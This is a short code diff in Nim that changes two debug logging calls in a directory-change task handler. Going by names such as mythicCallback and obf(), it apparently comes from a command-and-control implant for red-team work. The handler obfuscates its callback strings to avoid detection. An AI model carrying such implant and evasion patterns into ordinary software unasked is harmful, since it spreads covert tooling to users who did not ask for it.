@@ -11,7 +11,7 @@ proc changeDirectory*(taskId: string, params: string): JsonNode =
   # Parse arguments
   let args = parseJson(params).to(CdArgs)
   
-  debug "[DEBUG] Changing directory to: ", args.path
+  debugLog "cd", "Changing directory to: ", args.path
   
   try:
     # Check for UNC paths - Windows doesn't support cd to UNC paths
@@ -34,7 +34,7 @@ proc changeDirectory*(taskId: string, params: string): JsonNode =
     # Get the new current directory
     let newCwd = getCurrentDir()
     
-    debug "[DEBUG] Changed directory to: ", newCwd
+    debugLog "cd", "Changed directory to: ", newCwd
     
     # Return response with cwd callback
     return mythicCallback(taskId, obf("Changed directory to") & " '" & newCwd & "'", %*{
